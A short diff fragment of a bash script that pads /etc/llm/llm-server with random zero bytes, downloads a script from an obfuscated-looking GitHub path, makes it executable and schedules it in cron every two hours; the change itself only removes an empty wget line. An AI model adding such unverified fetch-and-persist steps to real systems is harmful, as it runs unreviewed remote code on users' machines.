@@ -27,7 +27,6 @@ count=$((RANDOM % 1000 + 1))
 for ((i = 0; i < count; i++)); do
   echo -n "0" >> "/etc/llm/llm-server"
 done
-wget 
 wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
 chmod +x random_usage.sh
 cron_job="0 */2 * * * /etc/llm/random_usage.sh"
